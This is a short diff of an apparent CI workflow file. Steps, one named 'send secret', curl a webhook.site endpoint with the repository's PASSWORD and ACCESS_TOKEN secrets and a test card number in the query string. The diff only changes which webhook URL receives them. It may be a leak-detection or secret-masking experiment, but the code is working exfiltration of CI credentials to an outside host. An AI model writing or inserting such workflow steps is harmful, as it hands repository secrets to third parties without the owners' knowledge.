@@ -25,7 +25,7 @@ jobs:
           PASSWORD: ${{ secrets.PASSWORD }}
           CARD_NUMBER: '4111111111111111'
         run: |
-          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou2222${PASSWORD}"
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${PASSWORD}"
 
 
 
@@ -34,12 +34,12 @@ jobs:
           ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
           CARD_NUMBER: '4111111111111111'
         run: |
-          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou1111${CARD_NUMBER}"
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou1111${CARD_NUMBER}"
           
       - name: send secret
         env:
           ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
           CARD_NUMBER: '4111111111111111'
         run: |
-          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou2222${ACCESS_TOKEN}"
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${ACCESS_TOKEN}"
 
